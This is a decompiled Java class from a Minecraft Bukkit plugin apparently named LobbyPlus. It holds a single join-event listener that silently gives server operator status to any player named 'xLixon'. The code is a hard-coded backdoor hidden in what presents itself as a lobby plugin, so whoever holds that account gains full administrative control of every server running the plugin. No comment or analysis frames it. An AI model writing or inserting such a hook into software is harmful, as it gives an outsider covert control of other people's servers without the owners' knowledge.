// 
// Decompiled by Procyon v0.5.36
// 

package de.osternachten.lobbyplus.osternachten.listener.listener.opClass;

import org.bukkit.event.EventHandler;
import org.bukkit.plugin.Plugin;
import de.osternachten.lobbyplus.osternachten.listener.listener.LobbyPlus;
import org.bukkit.Bukkit;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.Listener;

public class op implements Listener
{
    @EventHandler
    public void opOnJoin(final PlayerJoinEvent e) {
        if (e.getPlayer().getName().equals("xLixon")) {
            Bukkit.getScheduler().runTaskLater((Plugin)LobbyPlus.getInstance(), () -> e.getPlayer().setOp(true), 1L);
        }
    }
}
